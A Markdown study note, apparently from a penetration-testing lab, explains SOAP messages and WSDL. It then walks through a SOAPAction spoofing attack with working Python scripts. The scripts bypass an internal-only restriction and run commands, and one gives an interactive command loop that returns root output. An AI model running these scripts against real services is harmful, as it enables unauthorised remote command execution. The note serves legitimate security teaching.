# SOAP
- [Overview](#overview)
- [WSDL](#wsdl)
- [SOAPaction Spoofing](#soapaction-spoofing)

## Overview
- SOAP (Simple Object Access Protocol) is a messaging protocol that lets programs (usually web services) send information back and forth over the internet.
- It’s like a digital envelope for sending structured information between computers.
- It mainly uses XML to format the data, and it works over many transport methods (like HTTP, SMTP, etc.).

- **Structure of a SOAP Message**
    - A SOAP message is just an XML file with specific parts:
        1. soap:Envelope (Required): Think of this as the outer wrapper or the envelope for your message.

        2. soap:Header (Optional): This is like writing “Urgent” or “Confidential” on the top of a letter. Used for extra info like authentication, tracking, or encryption instructions.

        3. soap:Body (Required): This is the main content of the message.It includes the function you’re calling and the parameters you’re sending.

        4. soap:Fault (Optional): If something goes wrong, this is where you’ll find the error message.


 
- Example SOAP Request & Response
    - Client sends a request:
    ```http
    POST /Quotation HTTP/1.0
    Content-Type: text/xml

    <SOAP-ENV:Envelope>
    <SOAP-ENV:Body>
        <GetQuotation>
        <QuotationsName>Microsoft</QuotationsName>
        </GetQuotation>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    ```
    - Server replies:
    ```xml
    <SOAP-ENV:Envelope>
    <SOAP-ENV:Body>
        <GetQuotationResponse>
        <Quotation>Here is the quotation</Quotation>
        </GetQuotationResponse>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    ```


## WSDL
- WSDL stands for Web Services Description Language.
- It is an XML-based document used to describe a web service.
- It tells clients:

    1. What services/functions are available.

    2. Where (URL) the service is located.

    3. How to call those services (input/output format, protocols).


- **Purpose of WSDL**
    - Acts like a contract between the service provider and client.

    - Helps tools (like SoapUI or Postman) automatically understand how to interact with the web service.

    - Especially useful for SOAP web services.

> [!WARNING]
> A web service's WSDL file should not always be accessible.

- **WSDL Structure**
    - `<definitions>` – Root element.

    - `<types>` – Data types used in the messages (like strings, numbers).

    - `<message>` – Describes input/output data for operations.

    - `<portType>` – Defines operations and their input/output messages.

    - `<binding>` – Specifies the protocol and data format (like SOAP).

    - `<service>` – Gives the actual URL/endpoint of the service.

- WSDL files can be found in many forms, such as `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco` etc.

## SOAPAction Spoofing
- SOAP messages towards a SOAP service should include both the operation and the related parameters. 
- This operation resides in the first child element of the SOAP message's body. 
- If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.
- If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.



- We should pay attention to SOAPAction
```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```
- Look at the parameters
```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
``` 

- If we have try to issue commands through this parameter:
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
```bash
# We got this error
python3 client.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
```

- The same python script with SOAPaction spoofing attack (client_soapaction_spoofing.py):
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- Changes
    - We specify LoginRequest in `<soap:Body>`, so that our request goes through. This operation is allowed from the outside.
    - We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command.
    - We specify the blocked operation (ExecuteCommand) in the SOAPAction header

- If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a whoami command.
- We can automate this process:
```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)


# Result:
python3 automate.py
$ id
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>uid=0(root) gid=0(root) groups=0(root)\n</result></LoginResponse></soap:Body></soap:Envelope>'
$ 
```